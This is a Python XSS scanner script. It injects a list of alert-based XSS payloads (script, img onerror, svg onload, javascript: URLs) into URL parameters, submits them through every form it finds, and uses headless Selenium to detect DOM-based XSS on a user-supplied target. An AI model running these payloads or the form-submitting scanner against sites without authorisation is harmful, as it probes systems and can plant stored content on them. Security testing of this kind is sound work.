import requests
from urllib.parse import urlparse, parse_qs, urlunparse, urljoin
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import logging

# Banner
print("""
=========================================
      XSS Scanner by r10xM37
      Automated XSS Detection Tool
=========================================
""")

# Configure logging
logging.basicConfig(filename='xss_report.txt', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Enhanced XSS payloads
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "' onmouseover='alert(\"XSS\")'",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://example.com"
}

def check_reflected_xss(url):
    """Check for reflected XSS in URL parameters"""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    vulnerable = False

    for param in query_params:
        original_value = query_params[param][0]
        for payload in PAYLOADS:
            query_params[param] = [payload]
            modified_query = "&".join(f"{k}={v[0]}" for k,v in query_params.items())
            target_url = urlunparse(parsed_url._replace(query=modified_query))

            try:
                response = requests.get(target_url, headers=HEADERS, timeout=5)
                if payload in response.text:
                    logging.info(f"Reflected XSS found: {target_url} with payload {payload}")
                    print(f"[!] Reflected XSS found in parameter: {param}")
                    vulnerable = True
            except requests.exceptions.RequestException as e:
                logging.error(f"Request error for {target_url}: {e}")

        query_params[param] = [original_value]  # Restore original value
    return vulnerable


def check_stored_xss(url):
    """Check for stored XSS via forms"""
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        vulnerable = False

        for form in forms:
            form_action = form.get('action') or url
            form_method = form.get('method', 'get').lower()
            form_url = urljoin(url, form_action)

            form_data = {input_tag.get('name'): PAYLOADS[0] for input_tag in form.find_all('input') if input_tag.get('name')}

            try:
                if form_method == 'post':
                    submit_response = requests.post(form_url, data=form_data, headers=HEADERS, timeout=5)
                else:
                    submit_response = requests.get(form_url, params=form_data, headers=HEADERS, timeout=5)

                if PAYLOADS[0] in submit_response.text:
                    logging.info(f"Potential stored XSS at: {form_url} with payload {PAYLOADS[0]}")
                    print(f"[!] Stored XSS found in form at: {form_url}")
                    vulnerable = True
            except requests.exceptions.RequestException as e:
                logging.error(f"Error submitting form to {form_url}: {e}")
    
        return vulnerable
    except Exception as e:
        logging.error(f"Error checking stored XSS: {e}")
        return False


def check_dom_xss(url):
    """Check for DOM-based XSS using Selenium"""
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')
    driver = webdriver.Firefox(options=options)
    vulnerable = False
    
    try:
        for payload in PAYLOADS:
            target_url = f"{url}#{payload}"
            driver.get(target_url)
            
            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.accept()
                logging.info(f"DOM-based XSS detected: {target_url} with payload {payload}")
                print(f"[!] DOM-based XSS detected with payload: {payload}")
                vulnerable = True
            except TimeoutException:
                continue
    finally:
        driver.quit()
    return vulnerable


if __name__ == "__main__":
    target = input("Enter target URL: ").strip()
    
    print("\n[+] Testing reflected XSS...")
    if check_reflected_xss(target):
        print("--> Reflection vulnerabilities found!")
    else:
        print("--> No reflected XSS detected")
    
    print("\n[+] Testing stored XSS...")
    if check_stored_xss(target):
        print("--> Potential stored vulnerabilities found!")
    else:
        print("--> No stored XSS detected")
    
    print("\n[+] Testing DOM-based XSS...")
    if check_dom_xss(target):
        print("--> DOM vulnerabilities found!")
    else:
        print("--> No DOM-based XSS detected")
    
    print("\n[+] Scan complete. Check 'xss_report.txt' for details.")
